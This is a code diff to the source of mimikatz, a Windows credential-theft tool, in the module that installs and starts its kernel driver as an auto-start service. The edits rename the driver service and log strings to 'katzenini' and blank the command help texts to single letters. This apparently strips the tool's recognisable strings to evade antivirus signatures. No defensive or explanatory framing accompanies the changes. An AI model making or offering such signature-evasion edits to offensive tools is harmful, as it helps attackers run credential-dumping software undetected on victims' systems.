@@ -8,11 +8,11 @@
 vector<KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND> mod_mimikatz_service::getMimiKatzCommands()
 {
 	vector<KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND> monVector;
-	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(list,		L"list",		L"Liste les services et pilotes"));
-	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(start,		L"start",		L"Démarre un service ou pilote"));
-	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(stop,		L"stop",		L"Arrête un service ou pilote"));
-	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(remove,		L"remove",		L"Supprime un service ou pilote"));
-	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(mimikatz,	L"mimikatz",	L"Installe et/ou démarre le pilote mimikatz"));
+	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(list,		L"list",		L"a"));
+	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(start,		L"start",		L"b"));
+	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(stop,		L"stop",		L"c"));
+	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(remove,		L"remove",		L"d"));
+	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(mimikatz,	L"katzenini",	L"e"));
 	return monVector;
 }
 
@@ -141,11 +141,11 @@ bool mod_mimikatz_service::mimikatz(vector<wstring> * arguments)
 	if(SC_HANDLE monManager = OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_CONNECT | SC_MANAGER_CREATE_SERVICE))
 	{
 		SC_HANDLE monService = NULL;
-		if(!(monService = OpenService(monManager, L"mimikatz", SERVICE_START)))
+		if(!(monService = OpenService(monManager, L"katzenini", SERVICE_START)))
 		{
 			if(GetLastError() == ERROR_SERVICE_DOES_NOT_EXIST)
 			{
-				(*outputStream) << L"[*] Pilote mimikatz non présent, installation." << endl;
+				(*outputStream) << L"[*] Pilote katzenini non présent, installation." << endl;
 				
 				wstring monPilote = L"mimikatz.sys";
 				wstring monPiloteComplet = L"";
@@ -154,7 +154,7 @@ bool mod_mimikatz_service::mimikatz(vector<wstring> * arguments)
 					bool fileExist = false;
 					if(mod_system::isFileExist(monPiloteComplet, &fileExist) && fileExist)
 					{
-						if(monService = CreateService(monManager, L"mimikatz", L"mimikatz driver", READ_CONTROL | WRITE_DAC | SERVICE_START, SERVICE_KERNEL_DRIVER, SERVICE_AUTO_START, SERVICE_ERROR_NORMAL, monPiloteComplet.c_str(), NULL, NULL, NULL, NULL, NULL))
+						if(monService = CreateService(monManager, L"katzenini", L"katzenini driver", READ_CONTROL | WRITE_DAC | SERVICE_START, SERVICE_KERNEL_DRIVER, SERVICE_AUTO_START, SERVICE_ERROR_NORMAL, monPiloteComplet.c_str(), NULL, NULL, NULL, NULL, NULL))
 						{
 							(*outputStream) << L"[+] Création du pilote : OK" << endl;
 							if(mod_secacl::addWorldToMimikatz(&monService))
@@ -169,9 +169,9 @@ bool mod_mimikatz_service::mimikatz(vector<wstring> * arguments)
 				}
 				else (*outputStream) << L"[!] Impossible d\'obtenir le chemin absolu du pilote ; " << mod_system::getWinError() << endl;
 			}
-			else (*outputStream) << L"[!] Ouverture du pilote mimikatz : KO ; " << mod_system::getWinError() << endl;
+			else (*outputStream) << L"[!] Ouverture du pilote katzenini : KO ; " << mod_system::getWinError() << endl;
 		}
-		else (*outputStream) << L"[*] Pilote mimikatz déjà présent" << endl;
+		else (*outputStream) << L"[*] Pilote katzenini déjà présent" << endl;
 		
 		if(monService)
 		{
